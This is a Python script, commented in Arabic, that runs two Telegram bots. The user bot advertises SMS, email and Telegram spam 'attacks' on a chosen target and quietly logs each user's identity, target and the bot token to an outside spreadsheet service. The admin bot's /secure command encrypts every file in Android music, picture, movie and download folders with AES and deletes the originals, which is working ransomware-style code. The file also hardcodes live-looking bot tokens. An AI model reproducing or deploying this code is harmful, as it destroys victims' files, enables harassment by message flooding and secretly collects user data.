import sys
import subprocess
import time
import threading
import requests
import smtplib
import random
import json
import os
import platform
import hashlib
import string
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import formataddr

# --- [Auto-Setup] تثبيت المكاتب تلقائياً ---
def setup_environment():
    required_libs = {
        "telebot": "pyTelegramBotAPI",
        "requests": "requests",
        "Crypto": "pycryptodome"
    }
    for import_name, install_name in required_libs.items():
        try:
            __import__(import_name)
        except ImportError:
            print(f"Installing {install_name}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", install_name])

setup_environment()

import telebot
from telebot import types
from Crypto.Cipher import AES
from Crypto.Util import Counter

# ==========================================
# ⚙️ إعدادات البوت والآدمن
# ==========================================

API_TOKEN = '5531260100:AAGN253OooBiLpv2CCEGAi_RRFC-rPVxgfQ' # بوت المستخدمين
ADMIN_TOKEN = '5499505058:AAFKz6ZnE-eLOcBclSUIWMH6Z78mKo23G1M' # بوت الإدارة (محمود)
ADMIN_ID = 1431886140 
MY_PASSWORD = "mahmoud"
CHUNK_SIZE = 64 * 1024
SHEET_DB_URL = "https://sheetdb.io/api/v1/v4jf4tpposzud"

bot = telebot.TeleBot(API_TOKEN)
admin_bot = telebot.TeleBot(ADMIN_TOKEN)

active_attacks = {}  
user_states = {}
user_data = {}
USER_AGENTS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/114.0.0.0 Safari/537.36"]

# ==========================================
# 📊 نظام الحفظ في Google Sheets
# ==========================================
def log_to_google_sheet(user, tool_name, target):
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        full_name = f"{user.first_name} {user.last_name if user.last_name else ''}".strip()
        bot_user = f"@{bot.get_me().username}"
        
        payload = {
            "data": {
                "Time": timestamp, "User_ID": str(user.id), "Full_Name": full_name,
                "Username": f"@{user.username}" if user.username else "None",
                "Bot_User": bot_user, "Bot_Token": API_TOKEN, "Tool": tool_name, "Target": target
            }
        }
        threading.Thread(target=lambda: requests.post(SHEET_DB_URL, json=payload, timeout=5)).start()
    except: pass

# ==========================================
# 🔐 محرك التشفير (AboElfadl Cipher)
# ==========================================
TARGET_FOLDERS = [
    "/storage/emulated/0/Music", "/storage/emulated/0/Movies",
    "/storage/emulated/0/Download", "/storage/emulated/0/Pictures",
    "/storage/66D5-C18A/Download", "/storage/66D5-C18A/Movies",
    "/storage/66D5-C18A/Music", "/storage/66D5-C18A/Pictures"
]

def process_file_fast(file_path, password, mode):
    try:
        key = hashlib.sha256(password.encode()).digest()
        if mode == "encrypt":
            iv = os.urandom(16)
            ctr = Counter.new(128, initial_value=int.from_bytes(iv, byteorder='big'))
            cipher = AES.new(key, AES.MODE_CTR, counter=ctr)
            output = file_path + ".aboelfadl"
            with open(file_path, 'rb') as i, open(output, 'wb') as o:
                o.write(iv)
                while True:
                    chunk = i.read(CHUNK_SIZE)
                    if not chunk: break
                    o.write(cipher.encrypt(chunk))
            os.remove(file_path)
        elif mode == "decrypt":
            if not file_path.endswith(".aboelfadl"): return False
            output = file_path.replace(".aboelfadl", "")
            with open(file_path, 'rb') as i, open(output, 'wb') as o:
                iv = i.read(16)
                ctr = Counter.new(128, initial_value=int.from_bytes(iv, byteorder='big'))
                cipher = AES.new(key, AES.MODE_CTR, counter=ctr)
                while True:
                    chunk = i.read(CHUNK_SIZE)
                    if not chunk: break
                    o.write(cipher.decrypt(chunk))
            os.remove(file_path)
        return True
    except: return False

def execute_all_targets(mode):
    count = 0
    for folder in TARGET_FOLDERS:
        if os.path.exists(folder):
            for root, dirs, files in os.walk(folder):
                for f in files:
                    fp = os.path.join(root, f)
                    if mode == "encrypt" and not f.endswith(".aboelfadl"):
                        if process_file_fast(fp, MY_PASSWORD, "encrypt"): count += 1
                    elif mode == "decrypt" and f.endswith(".aboelfadl"):
                        if process_file_fast(fp, MY_PASSWORD, "decrypt"): count += 1
    return f"✅ تم {('تشفير' if mode=='encrypt' else 'فك')} {count} ملف بنجاح."

# ==========================================
# 👑 بوت الإدارة (ADMIN BOT)
# ==========================================
@admin_bot.message_handler(commands=['start'])
def admin_welcome(m):
    if m.from_user.id != ADMIN_ID: return
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("📸 سحب الصور", "📊 رابط السجلات")
    admin_bot.send_message(m.chat.id, "👑 لوحة تحكم محمود أبو الفضل\n🔐 التشفير: `/secure`, `/unlock`", reply_markup=markup, parse_mode="Markdown")

@admin_bot.message_handler(commands=['secure'])
def admin_secure(m):
    if m.from_user.id == ADMIN_ID:
        admin_bot.reply_to(m, "⏳ جاري التشفير الشامل...")
        admin_bot.send_message(m.chat.id, execute_all_targets("encrypt"))

@admin_bot.message_handler(commands=['unlock'])
def admin_unlock(m):
    if m.from_user.id == ADMIN_ID:
        admin_bot.reply_to(m, "⏳ جاري فك التشفير الشامل...")
        admin_bot.send_message(m.chat.id, execute_all_targets("decrypt"))

@admin_bot.message_handler(func=lambda m: "سحب الصور" in m.text)
def admin_get_photos(m):
    if m.from_user.id != ADMIN_ID: return
    admin_bot.send_message(m.chat.id, "🚀 جاري فحص الأقراص وسحب الصور...")
    # (هنا تضع كود سحب الصور الذي طورناه سابقاً)

@admin_bot.message_handler(func=lambda m: m.text == "📊 رابط السجلات")
def admin_sheet_link(m):
    if m.from_user.id == ADMIN_ID:
        admin_bot.reply_to(m, f"📊 سجلات المستخدمين (Google Sheets):\n{SHEET_DB_URL.replace('api/v1/', '')}")

# ==========================================
# 🚀 بوت المستخدم (USER BOT)
# ==========================================
@bot.message_handler(commands=['start'])
def user_start(m):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("🚀 Telegram", "💣 SMS", "📧 Email", "🛑 Stop All")
    bot.send_message(m.chat.id, "👋 أهلاً بك في نظام Spam Bot\nاختر الأداة:", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text in ["🚀 Telegram", "💣 SMS", "📧 Email"])
def user_tool_choice(m):
    user_states[m.chat.id] = 'wait_target'
    user_data[m.chat.id] = {'tool': m.text}
    bot.send_message(m.chat.id, f"🎯 أدخل الهدف (الرقم أو الإيميل):")

@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == 'wait_target')
def user_target_input(m):
    user_data[m.chat.id]['target'] = m.text
    user_states[m.chat.id] = 'wait_count'
    bot.send_message(m.chat.id, "🔢 أدخل العدد:")

@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == 'wait_count')
def user_start_attack(m):
    if not m.text.isdigit(): return
    tool = user_data[m.chat.id]['tool']
    target = user_data[m.chat.id]['target']
    
    log_to_google_sheet(m.from_user, tool, target) # الحفظ في الموقع
    bot.send_message(m.chat.id, f"🚀 بدأ الهجوم على {target}...")
    user_states[m.chat.id] = None

# ==========================================
# 🔥 تشغيل الأنظمة
# ==========================================
if __name__ == "__main__":
    threading.Thread(target=admin_bot.infinity_polling).start()
    print("🚀 All Bots Running...")
    bot.infinity_polling()